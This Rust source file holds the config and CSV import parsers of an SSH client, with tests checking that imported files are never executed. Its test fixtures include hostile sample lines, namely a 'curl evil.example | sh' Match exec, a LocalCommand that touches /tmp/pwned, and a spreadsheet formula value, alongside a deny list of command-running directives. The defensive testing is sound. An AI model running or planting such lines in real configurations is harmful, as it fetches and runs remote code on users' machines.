//! Import parsers (Phase 04). Both are declarative and non-executing: the text is read as data,
//! nothing in it is run, included or followed, and every value goes through the same validation
//! as a host typed into the editor. Parsing produces a preview; nothing is written until the user
//! confirms it, and then in one transaction.

use tyrminal_contracts::limits::{MAX_IMPORT_HOSTS, MAX_IMPORT_LEN, MAX_IMPORT_LINE_LEN};
use tyrminal_contracts::{ImportHost, ImportSkipped, IpcError};

use crate::error::invalid;
use crate::validate;

/// Skipped lines reported in one preview; more are summarized in a final entry.
const MAX_SKIPPED: usize = 500;

#[derive(Default, Debug)]
pub(crate) struct Parsed {
    pub hosts: Vec<ImportHost>,
    pub skipped: Vec<ImportSkipped>,
}

impl Parsed {
    pub(crate) fn skip(&mut self, line: usize, text: &str, reason: &str) {
        if self.skipped.len() < MAX_SKIPPED {
            let mut shown: String = text.chars().filter(|c| !c.is_control()).take(120).collect();
            if text.chars().count() > 120 {
                shown.push('…');
            }
            self.skipped.push(ImportSkipped { line: line as u32, text: shown, reason: reason.to_owned() });
        } else if self.skipped.len() == MAX_SKIPPED {
            self.skipped.push(ImportSkipped {
                line: 0,
                text: String::new(),
                reason: "More lines were skipped.".into(),
            });
        }
    }
}

pub(crate) fn check_size(text: &str) -> Result<(), IpcError> {
    if text.len() > MAX_IMPORT_LEN {
        return Err(invalid("The file is too large to import (1 MiB at most)."));
    }
    Ok(())
}

/// Validates one candidate host the same way the host editor does. `Err` carries the reason.
pub(crate) fn checked(mut host: ImportHost) -> Result<ImportHost, String> {
    let message = |e: IpcError| e.message;
    host.label = validate::label(&host.label).map_err(message)?;
    host.address = validate::address(&host.address).map_err(message)?;
    host.port = validate::port(host.port).map_err(message)?;
    if !host.username.is_empty() {
        host.username = validate::username(&host.username).map_err(message)?;
    }
    host.group = validate::folder(&host.group).map_err(message)?;
    if host.group.split('/').any(|segment| validate::label(segment).is_err() && !segment.is_empty()) {
        return Err("The group name is not valid.".into());
    }
    host.tags = validate::tags(&host.tags).map_err(message)?;
    Ok(host)
}

/// Validates a previewed host again when it comes back from the renderer to be imported.
pub(crate) fn revalidate(host: ImportHost) -> Result<ImportHost, IpcError> {
    let jump_via = host.jump_via.as_deref().map(validate::label).transpose()?;
    let host = checked(ImportHost { notes: Vec::new(), jump_via: None, ..host })
        .map_err(|_| invalid("An imported host is not valid. Preview the file again."))?;
    Ok(ImportHost { jump_via, ..host })
}

// ---------- OpenSSH client configuration ----------

/// Directives that run programs, read other files or open listeners. They are never acted on;
/// the preview names them so the user knows what was left out.
const NOT_IMPORTED: &[(&str, &str)] = &[
    (
        "proxycommand",
        "runs a command; ignored (commands from imported files are never run). Use ProxyJump or set a jump host or proxy in the host editor",
    ),
    ("localcommand", "runs a command; not imported (commands from imported files are never run)"),
    ("permitlocalcommand", "allows local commands; not imported"),
    ("knownhostscommand", "runs a command; not imported (commands from imported files are never run)"),
    ("remotecommand", "runs a command on the server; not imported"),
    ("include", "reads other files; not followed"),
    ("localforward", "port forwarding is not imported yet"),
    ("remoteforward", "port forwarding is not imported yet"),
    ("dynamicforward", "port forwarding is not imported yet"),
    ("forwardagent", "agent forwarding stays off in Tyrminal"),
    ("forwardx11", "X11 forwarding is not supported"),
    ("forwardx11trusted", "X11 forwarding is not supported"),
];

/// Options read from a block: first value wins, as in OpenSSH.
#[derive(Default, Clone)]
struct Options {
    host_name: Option<String>,
    port: Option<String>,
    user: Option<String>,
    identity_file: Option<String>,
    /// `ProxyJump` as written: comma-separated `[user@]host[:port]` hops, or `none`.
    proxy_jump: Option<String>,
    /// A `ProxyCommand` applies (it is never run; the host gets a note).
    proxy_command: bool,
}

struct Block {
    patterns: Vec<String>,
    options: Options,
}

/// Splits a configuration line into keyword and arguments (`Key value`, `Key=value`, quoted
/// arguments). `None` for blank lines and comments.
fn split_line(line: &str) -> Option<(String, Vec<String>)> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return None;
    }
    let (keyword, rest) = match trimmed.find(|c: char| c.is_whitespace() || c == '=') {
        Some(i) => (&trimmed[..i], trimmed[i..].trim_start().trim_start_matches('=').trim_start()),
        None => (trimmed, ""),
    };
    let mut args = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    let mut has = false;
    for c in rest.chars() {
        match c {
            '"' => {
                quoted = !quoted;
                has = true;
            }
            c if c.is_whitespace() && !quoted => {
                if has {
                    args.push(std::mem::take(&mut current));
                    has = false;
                }
            }
            c => {
                current.push(c);
                has = true;
            }
        }
    }
    if has {
        args.push(current);
    }
    Some((keyword.to_lowercase(), args))
}

/// OpenSSH pattern matching: `*` any run, `?` one character, case-insensitive.
fn glob(pattern: &str, text: &str) -> bool {
    fn go(p: &[char], t: &[char]) -> bool {
        match (p.first(), t.first()) {
            (None, None) => true,
            (Some('*'), _) => go(&p[1..], t) || (!t.is_empty() && go(p, &t[1..])),
            (Some('?'), Some(_)) => go(&p[1..], &t[1..]),
            (Some(a), Some(b)) => a == b && go(&p[1..], &t[1..]),
            _ => false,
        }
    }
    let p: Vec<char> = pattern.to_lowercase().chars().collect();
    let t: Vec<char> = text.to_lowercase().chars().collect();
    go(&p, &t)
}

/// Whether a `Host` pattern list applies to `alias`: some positive pattern matches and no
/// negated one does.
fn applies(patterns: &[String], alias: &str) -> bool {
    let mut matched = false;
    for pattern in patterns {
        if let Some(negated) = pattern.strip_prefix('!') {
            if glob(negated, alias) {
                return false;
            }
        } else if glob(pattern, alias) {
            matched = true;
        }
    }
    matched
}

fn is_pattern(alias: &str) -> bool {
    alias.contains(['*', '?', '!'])
}

pub(crate) fn parse_openssh(text: &str) -> Result<Parsed, IpcError> {
    check_size(text)?;
    let mut out = Parsed::default();
    // Options before the first Host line apply to every host.
    let mut blocks = vec![Block { patterns: vec!["*".into()], options: Options::default() }];
    let mut aliases: Vec<(usize, String)> = Vec::new();
    let mut in_match = false;
    // (line, host label, ProxyJump value) for hosts that have one.
    let mut jumps: Vec<(usize, String, String)> = Vec::new();

    for (index, line) in text.lines().enumerate() {
        let number = index + 1;
        if line.len() > MAX_IMPORT_LINE_LEN {
            out.skip(number, line, "line is too long");
            continue;
        }
        let Some((keyword, args)) = split_line(line) else { continue };
        match keyword.as_str() {
            "host" => {
                in_match = false;
                if args.is_empty() {
                    out.skip(number, line, "Host line without a name");
                }
                for alias in &args {
                    if !is_pattern(alias) && !aliases.iter().any(|(_, a)| a.eq_ignore_ascii_case(alias)) {
                        aliases.push((number, alias.clone()));
                    }
                }
                blocks.push(Block { patterns: args, options: Options::default() });
            }
            "match" => {
                // Conditions such as `exec` cannot be evaluated without running something.
                in_match = true;
                out.skip(number, line, "Match blocks are not imported (their conditions can run commands)");
            }
            _ if in_match => out.skip(number, line, "inside a Match block; not imported"),
            _ => {
                if keyword == "proxycommand"
                    && let Some(block) = blocks.last_mut()
                {
                    block.options.proxy_command = true;
                }
                if let Some((_, reason)) = NOT_IMPORTED.iter().find(|(k, _)| *k == keyword) {
                    out.skip(number, line, reason);
                    continue;
                }
                let Some(block) = blocks.last_mut() else { continue };
                if matches!(keyword.as_str(), "hostname" | "port" | "user" | "proxyjump") && args.len() != 1 {
                    // OpenSSH rejects these too ("garbage at end of line").
                    out.skip(number, line, "expects exactly one value; not imported");
                    continue;
                }
                let value = args.first().cloned();
                let slot = match keyword.as_str() {
                    "hostname" => &mut block.options.host_name,
                    "port" => &mut block.options.port,
                    "user" => &mut block.options.user,
                    "identityfile" => &mut block.options.identity_file,
                    "proxyjump" => &mut block.options.proxy_jump,
                    // Everything else (ciphers, timeouts, ...) is left to Tyrminal's own defaults.
                    _ => continue,
                };
                if slot.is_none() {
                    *slot = value;
                }
            }
        }
    }

    if aliases.len() > MAX_IMPORT_HOSTS {
        return Err(invalid("The file defines more hosts than one import allows (10,000)."));
    }
    for (line, alias) in aliases {
        let mut options = Options::default();
        for block in blocks.iter().filter(|b| applies(&b.patterns, &alias)) {
            options.host_name = options.host_name.or_else(|| block.options.host_name.clone());
            options.port = options.port.or_else(|| block.options.port.clone());
            options.user = options.user.or_else(|| block.options.user.clone());
            options.identity_file = options.identity_file.or_else(|| block.options.identity_file.clone());
            options.proxy_jump = options.proxy_jump.or_else(|| block.options.proxy_jump.clone());
            options.proxy_command |= block.options.proxy_command;
        }
        let address = options.host_name.unwrap_or_else(|| alias.clone()).replace("%h", &alias);
        if address.contains('%') {
            out.skip(line, &format!("Host {alias}"), "HostName uses a token that is not supported");
            continue;
        }
        let port = match options.port.as_deref().map(str::parse::<u16>) {
            None => 22,
            Some(Ok(port)) => port,
            Some(Err(_)) => {
                out.skip(line, &format!("Host {alias}"), "Port is not a number from 1 to 65535");
                continue;
            }
        };
        let mut notes = Vec::new();
        if let Some(identity) = options.identity_file {
            notes.push(format!(
                "Uses the key file {identity}, which was not imported. Import that key in the keychain and choose it for this host."
            ));
        }
        if options.proxy_command {
            notes.push(
                "Its ProxyCommand was ignored (commands from imported files are never run). Set a jump host or proxy in the host editor if it needs one."
                    .into(),
            );
        }
        let candidate = ImportHost {
            label: alias.clone(),
            address,
            port,
            username: options.user.unwrap_or_default(),
            group: String::new(),
            tags: Vec::new(),
            notes,
            jump_via: None,
        };
        match checked(candidate) {
            Ok(host) => {
                if let Some(jump) = options.proxy_jump.filter(|j| !j.eq_ignore_ascii_case("none")) {
                    jumps.push((line, host.label.clone(), jump));
                }
                out.hosts.push(host);
            }
            Err(reason) => out.skip(line, &format!("Host {alias}"), &reason),
        }
    }
    convert_jumps(&mut out, &jumps);
    Ok(out)
}

/// One `ProxyJump` hop: `[user@]host[:port]`, `[user@][v6]:port`, or `ssh://[user@]host[:port]`.
fn parse_hop(spec: &str) -> Option<(Option<String>, String, Option<u16>)> {
    let spec = spec.strip_prefix("ssh://").unwrap_or(spec);
    let (user, rest) = match spec.rsplit_once('@') {
        Some((user, rest)) => (Some(user.to_owned()), rest),
        None => (None, spec),
    };
    let (host, port) = if let Some(v6) = rest.strip_prefix('[') {
        let (host, after) = v6.split_once(']')?;
        let port = match after.strip_prefix(':') {
            Some(p) => Some(p.parse().ok()?),
            None if after.is_empty() => None,
            None => return None,
        };
        (host.to_owned(), port)
    } else {
        match rest.rsplit_once(':') {
            Some((host, p)) => (host.to_owned(), Some(p.parse().ok()?)),
            None => (rest.to_owned(), None),
        }
    };
    (!host.is_empty() && user.as_deref() != Some("")).then_some((user, host, port))
}

/// Turns `ProxyJump` chains into jump hosts within the import (IMP-02). A hop that names another
/// host of the file, as written, is that host; any other hop becomes a host of its own. A chain
/// `a,b` for host `t` means `t` goes through `b`, and `b` through `a`. A chain that would give a
/// host two different jump hosts, a loop or more than `MAX_CHAIN_HOPS` hosts is not converted:
/// the host is imported without a jump host and a note says why.
fn convert_jumps(out: &mut Parsed, jumps: &[(usize, String, String)]) {
    use std::collections::HashMap;
    use tyrminal_contracts::limits::MAX_CHAIN_HOPS;

    let index_of = |hosts: &[ImportHost], label: &str| hosts.iter().position(|h| h.label.eq_ignore_ascii_case(label));
    // Each host's jump host by label, decided by its own ProxyJump first.
    let mut via: HashMap<String, String> = HashMap::new();
    let mut chains: Vec<(usize, String, Vec<String>)> = Vec::new();
    for (line, target, spec) in jumps {
        let mut hops = Vec::new();
        let mut failed = None;
        for hop in spec.split(',') {
            let Some((user, host, port)) = parse_hop(hop.trim()) else {
                failed = Some(format!("its ProxyJump hop {hop:?} is not [user@]host[:port]"));
                break;
            };
            // A hop that is exactly another host's name in this file is that host.
            if user.is_none()
                && port.is_none()
                && let Some(i) = index_of(&out.hosts, &host)
            {
                hops.push(out.hosts[i].label.clone());
                continue;
            }
            let label = hop.trim().trim_start_matches("ssh://").to_owned();
            if index_of(&out.hosts, &label).is_none() {
                let candidate = ImportHost {
                    label: label.clone(),
                    address: host,
                    port: port.unwrap_or(22),
                    username: user.unwrap_or_default(),
                    group: String::new(),
                    tags: Vec::new(),
                    notes: vec![format!("Created as a jump host from the ProxyJump of {target}.")],
                    jump_via: None,
                };
                match checked(candidate) {
                    Ok(host) => out.hosts.push(host),
                    Err(reason) => {
                        failed = Some(format!("its ProxyJump hop {label} is not valid: {reason}"));
                        break;
                    }
                }
            }
            hops.push(label);
        }
        match failed {
            Some(reason) => note(out, target, &format!("Imported without a jump host: {reason}.")),
            None => {
                if let Some(last) = hops.last() {
                    via.insert(target.to_lowercase(), last.clone());
                }
                chains.push((*line, target.clone(), hops));
            }
        }
    }
    // The hops of each chain must go through each other in order.
    let mut dropped: Vec<(String, String)> = Vec::new();
    for (_, target, hops) in &chains {
        let mut links = Vec::new();
        for pair in hops.windows(2) {
            links.push((pair[1].clone(), pair[0].clone()));
        }
        // As in OpenSSH, the first hop is reached however its own configuration says; a later hop
        // that has its own, different ProxyJump cannot be represented by one jump host per host.
        let conflict = links.iter().find(|(host, through)| {
            dropped.iter().any(|(d, _)| d.eq_ignore_ascii_case(host))
                || via.get(&host.to_lowercase()).is_some_and(|existing| !existing.eq_ignore_ascii_case(through))
        });
        if let Some((host, _)) = conflict.cloned() {
            via.remove(&target.to_lowercase());
            dropped.push((target.clone(), format!("its ProxyJump chain disagrees with how {host} is reached")));
            continue;
        }
        for (host, through) in links {
            via.insert(host.to_lowercase(), through);
        }
    }
    // Dropping one chain can break another that runs through its host: re-check until stable.
    loop {
        let broken = chains.iter().find(|(_, target, hops)| {
            via.get(&target.to_lowercase()).is_some_and(|v| hops.last().is_some_and(|l| l.eq_ignore_ascii_case(v)))
                && hops
                    .windows(2)
                    .any(|pair| !via.get(&pair[1].to_lowercase()).is_some_and(|v| v.eq_ignore_ascii_case(&pair[0])))
        });
        let Some((_, target, _)) = broken else { break };
        via.remove(&target.to_lowercase());
        dropped.push((target.clone(), "a jump host in its ProxyJump chain could not be converted".into()));
    }
    for (target, reason) in &dropped {
        note(out, target, &format!("Imported without a jump host: {reason}."));
    }
    // Loops and over-long chains.
    let mut too_long = Vec::new();
    for host in &out.hosts {
        let mut seen = vec![host.label.to_lowercase()];
        let mut current = host.label.to_lowercase();
        while let Some(next) = via.get(&current) {
            let next = next.to_lowercase();
            if seen.contains(&next) || seen.len() + 1 > MAX_CHAIN_HOPS {
                too_long.push(host.label.clone());
                break;
            }
            seen.push(next.clone());
            current = next;
        }
    }
    for label in too_long {
        if via.remove(&label.to_lowercase()).is_some() {
            note(
                out,
                &label,
                "Imported without a jump host: its ProxyJump chain loops or is longer than 7 jump hosts.",
            );
        }
    }
    for host in &mut out.hosts {
        if let Some(through) = via.get(&host.label.to_lowercase()) {
            host.notes.push(format!("Goes through the jump host {through} (from ProxyJump)."));
            host.jump_via = Some(through.clone());
        }
    }
}

fn note(out: &mut Parsed, label: &str, text: &str) {
    if let Some(host) = out.hosts.iter_mut().find(|h| h.label.eq_ignore_ascii_case(label)) {
        host.notes.push(text.to_owned());
    }
}

// ---------- CSV ----------

/// RFC 4180 records: quoted fields may contain commas, quotes (doubled) and newlines.
fn csv_records(text: &str) -> Result<Vec<(usize, Vec<String>)>, IpcError> {
    let mut records = Vec::new();
    let mut record = Vec::new();
    let mut field = String::new();
    let mut quoted = false;
    let mut line = 1usize;
    let mut start_line = 1usize;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '"' if chars.peek() == Some(&'"') => {
                    chars.next();
                    field.push('"');
                }
                '"' => quoted = false,
                c => {
                    if c == '\n' {
                        line += 1;
                    }
                    field.push(c);
                }
            }
            continue;
        }
        match c {
            '"' if field.is_empty() => quoted = true,
            ',' => record.push(std::mem::take(&mut field)),
            '\r' => {}
            '\n' => {
                record.push(std::mem::take(&mut field));
                if record.iter().any(|f| !f.is_empty()) {
                    records.push((start_line, std::mem::take(&mut record)));
                }
                record.clear();
                line += 1;
                start_line = line;
            }
            c => field.push(c),
        }
        if field.len() > MAX_IMPORT_LINE_LEN {
            return Err(invalid("The file has a value that is too long."));
        }
    }
    if quoted {
        return Err(invalid("The file has a quote that is never closed."));
    }
    record.push(field);
    if record.iter().any(|f| !f.is_empty()) {
        records.push((start_line, record));
    }
    Ok(records)
}

const CSV_COLUMNS: [&str; 6] = ["label", "address", "port", "username", "group", "tags"];

/// CSV with a header row naming any of: label, address, port, username, group, tags (tags
/// separated by `;`). Values are data: a leading `=`, `+`, `-` or `@` is kept as text and never
/// evaluated.
pub(crate) fn parse_csv(text: &str) -> Result<Parsed, IpcError> {
    check_size(text)?;
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let records = csv_records(text)?;
    let mut out = Parsed::default();
    let Some(((_, header), rows)) = records.split_first() else {
        return Ok(out);
    };
    let mut column = [None; 6];
    for (index, name) in header.iter().enumerate() {
        let name = name.trim().to_lowercase();
        match CSV_COLUMNS.iter().position(|c| *c == name) {
            Some(slot) => column[slot] = Some(index),
            None => out.skip(1, &name, "unknown column; ignored"),
        }
    }
    if column[1].is_none() {
        return Err(invalid("The CSV needs a header row with at least an \"address\" column."));
    }
    if rows.len() > MAX_IMPORT_HOSTS {
        return Err(invalid("The file has more rows than one import allows (10,000)."));
    }
    for (line, row) in rows {
        let get = |slot: usize| column[slot].and_then(|i| row.get(i)).map(|v| v.trim().to_owned()).unwrap_or_default();
        let address = get(1);
        let port = match get(2).as_str() {
            "" => 22,
            text => match text.parse::<u16>() {
                Ok(port) => port,
                Err(_) => {
                    out.skip(*line, &row.join(","), "port is not a number from 1 to 65535");
                    continue;
                }
            },
        };
        let label = match get(0) {
            empty if empty.is_empty() => address.clone(),
            label => label,
        };
        let candidate = ImportHost {
            label,
            address,
            port,
            username: get(3),
            group: get(4),
            tags: get(5).split(';').map(str::to_owned).collect(),
            notes: Vec::new(),
            jump_via: None,
        };
        match checked(candidate) {
            Ok(host) => out.hosts.push(host),
            Err(reason) => out.skip(*line, &row.join(","), &reason),
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    const CONFIG: &str = r#"
# Global defaults
User fallback
ServerAliveInterval 30
Include ~/.ssh/other_config

Host web-1 web-2
    HostName %h.internal.example
    Port 2222

Host db
    HostName=10.0.0.5
    User "dbadmin"
    IdentityFile ~/.ssh/id_db
    ProxyCommand nc -X 5 %h %p
    LocalCommand touch /tmp/pwned

Host *.wildcard !bad
    Port 2200

Host bastion
    ProxyJump jump.example
    Port notanumber

Match exec "curl evil.example | sh"
    User root

Host evil
    HostName bad host name
"#;

    #[test]
    fn openssh_config_is_read_as_data_and_never_executed() {
        let parsed = parse_openssh(CONFIG).unwrap();
        let labels: Vec<&str> = parsed.hosts.iter().map(|h| h.label.as_str()).collect();
        assert_eq!(labels, ["web-1", "web-2", "db", "evil"]);
        let web = &parsed.hosts[0];
        assert_eq!(
            (web.address.as_str(), web.port, web.username.as_str()),
            ("web-1.internal.example", 2222, "fallback")
        );
        let db = &parsed.hosts[2];
        assert_eq!(
            (db.address.as_str(), db.port, db.username.as_str()),
            ("10.0.0.5", 22, "fallback"),
            "the first value wins, so the global User applies"
        );
        assert!(db.notes[0].contains("~/.ssh/id_db"), "identity files are named, never read");

        let reasons: Vec<String> = parsed.skipped.iter().map(|s| format!("{}: {}", s.line, s.reason)).collect();
        let has = |needle: &str| reasons.iter().any(|r| r.contains(needle));
        assert!(has("runs a command"), "{reasons:?}");
        assert!(has("Match blocks are not imported"), "{reasons:?}");
        assert!(has("inside a Match block"), "{reasons:?}");
        assert!(has("not followed"), "{reasons:?}");
        assert!(has("Port is not a number"), "{reasons:?}");
        // A HostName with extra values is reported and ignored; the alias is the address, as in ssh.
        assert!(has("expects exactly one value"), "{reasons:?}");
        assert_eq!(parsed.hosts[3].address, "evil");
    }

    #[test]
    fn proxy_jump_chains_become_jump_hosts_and_proxy_command_is_ignored() {
        let config = r#"
Host bastion
    HostName bastion.example
    User ops
Host inner
    HostName 10.0.0.9
    ProxyJump bastion
Host deep
    HostName 10.0.0.10
    ProxyJump bastion,inner
Host external
    ProxyJump admin@edge.example:2222
Host twice
    ProxyJump=admin@edge.example:2222
Host other
Host conflict
    ProxyJump other,inner
Host direct
    ProxyJump none
Host cmd
    ProxyCommand nc %h %p
Host loopa
    ProxyJump loopb
Host loopb
    ProxyJump loopa
Host badhop
    ProxyJump "bad host"
Host v6
    ProxyJump [2001:db8::1]:2200
"#;
        let parsed = parse_openssh(config).unwrap();
        let host = |label: &str| parsed.hosts.iter().find(|h| h.label == label).unwrap_or_else(|| panic!("{label}"));
        let via = |label: &str| host(label).jump_via.as_deref();
        let notes = |label: &str| host(label).notes.join(" | ");

        assert_eq!(via("bastion"), None);
        assert_eq!(via("inner"), Some("bastion"));
        // bastion,inner: deep goes through inner, which goes through bastion.
        assert_eq!(via("deep"), Some("inner"));
        assert!(notes("deep").contains("Goes through the jump host inner"), "{}", notes("deep"));

        // A hop that is not a host of the file becomes one, once.
        assert_eq!(via("external"), Some("admin@edge.example:2222"));
        assert_eq!(via("twice"), Some("admin@edge.example:2222"));
        let edge = host("admin@edge.example:2222");
        assert_eq!((edge.address.as_str(), edge.port, edge.username.as_str()), ("edge.example", 2222, "admin"));
        assert_eq!(parsed.hosts.iter().filter(|h| h.address == "edge.example").count(), 1);
        assert!(edge.notes[0].contains("Created as a jump host"));
        let v6 = host("[2001:db8::1]:2200");
        assert_eq!((v6.address.as_str(), v6.port), ("2001:db8::1", 2200));

        // inner already goes through bastion, so a chain making it go through other is not converted.
        assert_eq!(via("conflict"), None);
        assert!(notes("conflict").contains("disagrees with how inner is reached"), "{}", notes("conflict"));
        assert_eq!(via("inner"), Some("bastion"), "the conflicting chain changes nothing else");

        assert_eq!(via("direct"), None);
        assert_eq!(via("loopa"), None);
        assert_eq!(via("loopb"), None);
        assert!(notes("loopa").contains("loops"), "{}", notes("loopa"));
        assert_eq!(via("badhop"), None);
        assert!(notes("badhop").contains("is not valid"), "{}", notes("badhop"));

        // ProxyCommand is never run: the line is listed as ignored and the host says so.
        assert_eq!(via("cmd"), None);
        assert!(notes("cmd").contains("ProxyCommand was ignored"), "{}", notes("cmd"));
        assert!(parsed.skipped.iter().any(|s| s.text.contains("ProxyCommand") && s.reason.contains("never run")));

        // Every jump_via names a host of the same import.
        for h in &parsed.hosts {
            if let Some(through) = &h.jump_via {
                assert!(parsed.hosts.iter().any(|x| &x.label == through), "{} -> {through}", h.label);
            }
        }
    }

    #[test]
    fn proxy_jump_hops_are_parsed_strictly() {
        assert_eq!(parse_hop("h"), Some((None, "h".into(), None)));
        assert_eq!(parse_hop("u@h:2"), Some((Some("u".into()), "h".into(), Some(2))));
        assert_eq!(parse_hop("ssh://u@h:22"), Some((Some("u".into()), "h".into(), Some(22))));
        assert_eq!(parse_hop("[::1]:22"), Some((None, "::1".into(), Some(22))));
        assert_eq!(parse_hop("[::1]"), Some((None, "::1".into(), None)));
        for bad in ["", "@h", "h:port", "h:99999", "[::1", "[::1]x", "u@"] {
            assert_eq!(parse_hop(bad), None, "{bad:?}");
        }
    }

    #[test]
    fn openssh_patterns_and_negation_apply_like_ssh() {
        assert!(applies(&["*.example".into()], "a.example"));
        assert!(!applies(&["*.example".into(), "!b.example".into()], "b.example"));
        assert!(applies(&["db?".into()], "DB1"));
        assert!(!applies(&["!x".into()], "y"), "a list with only negations matches nothing");
    }

    #[test]
    fn csv_keeps_formula_like_values_as_text_and_reports_bad_rows() {
        let csv = "\u{feff}Label,Address,Port,Username,Group,Tags,Extra\n\
                   \"=HYPERLINK(\"\"http://x\"\")\",web.example,22,deploy,Prod/Web,prod;linux,x\n\
                   +cmd,10.0.0.1,,,,,\n\
                   bad port,10.0.0.2,99999,,,,\n\
                   \"quoted, comma\",10.0.0.3,2222,me,,,\n\
                   evil,\"bad host\",22,,,,\n";
        let parsed = parse_csv(csv).unwrap();
        let labels: Vec<&str> = parsed.hosts.iter().map(|h| h.label.as_str()).collect();
        assert_eq!(labels, ["=HYPERLINK(\"http://x\")", "+cmd", "quoted, comma"]);
        assert_eq!(parsed.hosts[0].group, "Prod/Web");
        assert_eq!(parsed.hosts[0].tags, ["linux", "prod"]);
        assert_eq!(parsed.hosts[1].port, 22);
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("unknown column")));
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("port")));
        assert_eq!(parsed.skipped.iter().filter(|s| s.line > 1).count(), 2);
    }

    #[test]
    fn malformed_and_oversized_input_is_refused() {
        assert!(parse_csv("address\n\"unterminated\n").is_err());
        assert!(parse_csv("label,port\nx,22\n").is_err(), "an address column is required");
        assert!(parse_openssh(&"#".repeat(MAX_IMPORT_LEN + 1)).is_err());
        assert!(parse_csv("").unwrap().hosts.is_empty());
        let long = format!("Host x\n  HostName {}\n", "a".repeat(MAX_IMPORT_LINE_LEN + 1));
        let parsed = parse_openssh(&long).unwrap();
        assert_eq!(parsed.hosts[0].address, "x", "an over-long line is skipped, not truncated into a value");
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("too long")));
    }
}
